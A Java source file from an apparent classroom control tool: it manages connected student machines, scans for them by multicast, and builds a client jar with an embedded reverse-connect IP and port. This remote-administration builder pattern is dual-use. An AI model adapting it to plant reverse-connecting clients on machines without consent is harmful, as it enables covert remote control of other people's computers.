package com.godpalace.teacher3.manager;

import com.godpalace.teacher3.Main;
import com.godpalace.teacher3.Student;
import com.godpalace.teacher3.fx.message.Notification;
import com.godpalace.teacher3.module.Module;
import io.netty.bootstrap.Bootstrap;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.EventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import javafx.collections.FXCollections;
import javafx.collections.ListChangeListener;
import javafx.collections.ObservableList;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.Parent;
import javafx.scene.control.*;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.input.MouseButton;
import javafx.scene.layout.HBox;
import javafx.stage.Popup;
import lombok.Getter;
import lombok.extern.slf4j.Slf4j;
import org.kordamp.ikonli.boxicons.BoxiconsRegular;
import org.kordamp.ikonli.javafx.FontIcon;
import org.pomo.toasterfx.model.impl.ToastTypes;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;

@Slf4j
public class StudentManager {
    @Getter
    private static final ObservableList<Student> students =
            FXCollections.synchronizedObservableList(FXCollections.observableArrayList());

    @Getter
    private static final ObservableList<Student> selectedStudents =
            FXCollections.synchronizedObservableList(FXCollections.observableArrayList());

    static {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            for (Student student : students) {
                student.close();
            }
        }));
    }

    public static Student getFirstStudent() {
        if (students.isEmpty()) return null;
        return students.get(0);
    }

    public static Student getFirstSelectedStudent() {
        if (selectedStudents.isEmpty()) return null;
        return selectedStudents.get(0);
    }

    public static void addStudent(Student student) {
        students.add(student);
    }

    public static boolean removeStudent(int id) {
        for (Student student : students) {
            if (student.getId() == id) {
                students.remove(student);
                deselectStudent(student);

                return true;
            }
        }

        return false;
    }

    public static void removeStudent(Student student) {
        if (!students.contains(student))
            return;

        students.remove(student);
        deselectStudent(student);
    }

    public static boolean selectStudent(int id) {
        for (Student student : students) {
            if (student.getId() == id) {
                selectedStudents.add(student);

                return true;
            }
        }

        return false;
    }

    public static void selectStudent(Student student) {
        if (!students.contains(student))
            return;

        selectedStudents.add(student);
    }

    public static boolean deselectStudent(int id) {
        for (Student student : selectedStudents) {
            if (student.getId() == id) {
                selectedStudents.remove(student);

                return true;
            }
        }

        return false;
    }

    public static void deselectStudent(Student student) {
        if (!selectedStudents.contains(student))
            return;

        selectedStudents.remove(student);
    }

    public static void selectAllStudents() {
        clearSelectedStudents();
        selectedStudents.addAll(students);
    }

    public static void clearSelectedStudents() {
        selectedStudents.clear();
    }

    public static Student getStudent(int id) {
        for (Student student : students) {
            if (student.getId() == id) {
                return student;
            }
        }

        return null;
    }

    public static Student connect(String ip) throws Exception {
        InetSocketAddress address = new InetSocketAddress(ip, 37000);
        if (!address.getAddress().isReachable(5000))
            throw new SocketException(ip + "不存在或不可到达");

        EventLoopGroup group = ThreadPoolManager.getGroup();
        Bootstrap bootstrap = new Bootstrap();
        bootstrap.group(group)
                .channel(NioSocketChannel.class)
                .handler(new ChannelInitializer<SocketChannel>() {
                    @Override
                    protected void initChannel(SocketChannel ch) {
                    }
                });

        Student student = new Student(bootstrap.connect(address).sync().channel());
        addStudent(student);

        return student;
    }

    public static void disconnect(Student student) throws IOException {
        removeStudent(student);
        student.close();
    }

    public static boolean scan() throws IOException {
        for (NetworkInterface anInterface : Main.getIpv4s().values()) {
            InetSocketAddress group = new InetSocketAddress(Main.IPV4_MULTICAST_GROUP, Main.SCAN_PORT);

            try (MulticastSocket socket = new MulticastSocket()) {
                socket.joinGroup(group, anInterface);

                byte[] data = new byte[1];
                data[0] = (byte) 1;

                DatagramPacket packet = new DatagramPacket(data, data.length, group);
                socket.send(packet);
            } catch (IOException e) {
                log.error("Error in scan ipv4, cause: {}", e.getMessage());
                return false;
            }
        }

        for (NetworkInterface anInterface : Main.getIpv6s().values()) {
            InetSocketAddress group = new InetSocketAddress(Main.IPV6_MULTICAST_GROUP, Main.SCAN_PORT);

            try (MulticastSocket socket = new MulticastSocket()) {
                socket.joinGroup(group, anInterface);

                byte[] data = new byte[1];
                data[0] = (byte) 1;

                DatagramPacket packet = new DatagramPacket(data, data.length, group);
                socket.send(packet);
            } catch (IOException e) {
                log.error("Error in scan ipv6, cause: {}", e.getMessage());
                return false;
            }
        }

        return true;
    }

    public static void build() throws IOException {
        build(new File(System.currentTimeMillis() + "-Student.jar"));
    }

    public static void build(InetSocketAddress address) throws IOException {
        build(address, new File(System.currentTimeMillis() + "-Student.jar"));
    }

    public static void build(File file) throws IOException {
        build(null, file);
    }

    public static void build(InetSocketAddress address, File file) throws IOException {
        File tempFile = new File(System.getenv("TEMP") + "\\Student.jar");

        // 输出到临时文件
        InputStream in = StudentManager.class.getResourceAsStream("/Student.jar");
        if (in == null) throw new IOException("Student.jar not found");
        FileOutputStream out = new FileOutputStream(tempFile);

        byte[] buffer = new byte[10240];
        int len;
        while ((len = in.read(buffer)) != -1) {
            out.write(buffer, 0, len);
        }
        out.close();

        // 写入临时数据
        ZipInputStream zipIn = new ZipInputStream(new FileInputStream(tempFile));
        ZipOutputStream zipOut = new ZipOutputStream(new FileOutputStream(file));
        ZipEntry entry = zipIn.getNextEntry();

        while (entry != null) {
            zipOut.putNextEntry(new ZipEntry(entry.getName()));
            buffer = new byte[10240];

            while ((len = zipIn.read(buffer)) != -1) {
                zipOut.write(buffer, 0, len);
            }

            zipOut.closeEntry();
            entry = zipIn.getNextEntry();
        }

        // 写入反向连接配置
        if (address != null) {
            byte[] ipBytes = address.getAddress().getHostAddress().getBytes(StandardCharsets.UTF_8);
            int port = address.getPort();
            int ipLength = ipBytes.length;

            try {
                byte[] configData = new byte[ipLength + 3];

                // IP地址长度
                configData[0] = (byte) ipLength;

                // IP地址
                System.arraycopy(ipBytes, 0, configData, 1, ipBytes.length);

                // 端口号
                configData[ipLength + 1] = (byte) (port & 0xFF);
                configData[ipLength + 2] = (byte) ((port >> 8) & 0xFF);

                // 写入配置数据
                zipOut.putNextEntry(new ZipEntry("ReverseConnectConfig.data"));
                zipOut.write(configData);
                zipOut.closeEntry();
            } catch (NumberFormatException e) {
                if (Main.isRunOnCmd()) System.out.println("命令格式错误, 请使用格式: student build [ip] [port]");
                return;
            }
        }

        zipOut.close();
        zipIn.close();
        tempFile.delete();

        in.close();
    }

    // GUI部分的代码
    private static final int ICON_SIZE   = 16;
    private static final int ICON_SPACER = 10;

    @Getter
    private static TableView<Student> studentTable;

    private static void onListChanged() {
        ObservableList<Student> items = studentTable.getSelectionModel().getSelectedItems();

        if (!items.isEmpty()) {
            for (Module module : ModuleManager.getShellMap().values()) {
                Button button = ModuleManager.getGuiButtons().get(module.getID());
                if (button == null) continue;

                if (module.isSupportMultiSelection()) {
                    button.setDisable(false);
                } else {
                    button.setDisable(items.size() > 1);
                }
            }
        } else {
            for (Button button : ModuleManager.getGuiButtons().values()) {
                button.setDisable(true);
            }
        }

        selectedStudents.setAll(items);
    }

    private static void setRightClickMenu() {
        Popup popup = new Popup();
        Button disconnectButton = new Button("断开连接");

        // Button
        disconnectButton.setOnAction(event -> {
            popup.hide();

            Student student = studentTable.getSelectionModel().getSelectedItem();
            if (student == null) return;

            try {
                disconnect(student);
            } catch (IOException e) {
                Alert alert = new Alert(Alert.AlertType.ERROR);
                alert.setGraphic(new FontIcon(BoxiconsRegular.ERROR));
                alert.setTitle("错误");
                alert.setHeaderText("断开连接失败");
                alert.setContentText(e.getMessage());
                alert.showAndWait();
            }
        });

        // Popup
        popup.setAutoHide(true);
        popup.setOnAutoHide(event -> popup.hide());
        popup.getContent().addAll(disconnectButton);

        studentTable.setOnMouseClicked(event -> {
            if (event.getButton().equals(MouseButton.SECONDARY)) {
                if (studentTable.getSelectionModel().getSelectedItem() == null) return;
                popup.show(studentTable, event.getScreenX(), event.getScreenY());
            } else {
                popup.hide();
            }
        });
    }

    private static Node getPlaceholder() {
        HBox hBox = new HBox();
        hBox.setAlignment(Pos.CENTER);
        hBox.setSpacing(0);

        Label label = new Label("当前没有在线的学生, ");
        label.setAlignment(Pos.CENTER);
        label.setGraphic(new FontIcon(BoxiconsRegular.USER_X));
        label.setGraphicTextGap(ICON_SPACER);
        hBox.getChildren().add(label);

        Hyperlink hyperlink = new Hyperlink("点击此处进行自动扫描");
        hyperlink.setOnAction(event -> {
            try {
                if (scan()) {
                    Notification.show(
                            "扫描完成", "扫描已经完成了", ToastTypes.SUCCESS);
                } else {
                    Alert alert = new Alert(Alert.AlertType.ERROR);
                    alert.setGraphic(new FontIcon(BoxiconsRegular.ERROR));
                    alert.setTitle("错误");
                    alert.setHeaderText("自动扫描失败");
                    alert.setContentText("请检查网络连接或手动输入IP地址");
                    alert.showAndWait();
                }
            } catch (IOException e) {
                Alert alert = new Alert(Alert.AlertType.ERROR);
                alert.setGraphic(new FontIcon(BoxiconsRegular.ERROR));
                alert.setTitle("错误");
                alert.setHeaderText("自动扫描失败");
                alert.setContentText(e.getMessage());
                alert.showAndWait();
            }
        });
        hBox.getChildren().add(hyperlink);

        return hBox;
    }

    public static Parent getUI() {
        studentTable = new TableView<>(students);
        studentTable.setPlaceholder(getPlaceholder());
        studentTable.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);
        studentTable.getSelectionModel().setSelectionMode(SelectionMode.MULTIPLE);
        studentTable.setEditable(false);

        studentTable.getSelectionModel().getSelectedItems().addListener(
                (ListChangeListener<Student>) change -> onListChanged());
        students.addListener((ListChangeListener<Student>) change -> studentTable.refresh());

        TableColumn<Student, Integer> idColumn = new TableColumn<>("ID");
        TableColumn<Student, String> nameColumn = new TableColumn<>("主机名");
        TableColumn<Student, String> ipColumn = new TableColumn<>("IP地址");
        TableColumn<Student, Integer> portColumn = new TableColumn<>("端口号");

        idColumn.setSortable(true);
        nameColumn.setSortable(false);
        ipColumn.setSortable(false);
        portColumn.setSortable(false);

        idColumn.setMinWidth(50);
        nameColumn.setMinWidth(100);
        ipColumn.setMinWidth(100);
        portColumn.setMinWidth(50);

        idColumn.setCellValueFactory(new PropertyValueFactory<>("id"));
        nameColumn.setCellValueFactory(new PropertyValueFactory<>("name"));
        ipColumn.setCellValueFactory(new PropertyValueFactory<>("ip"));
        portColumn.setCellValueFactory(new PropertyValueFactory<>("port"));
        studentTable.getColumns().addAll(idColumn, nameColumn, ipColumn, portColumn);

        setRightClickMenu();

        return studentTable;
    }
}
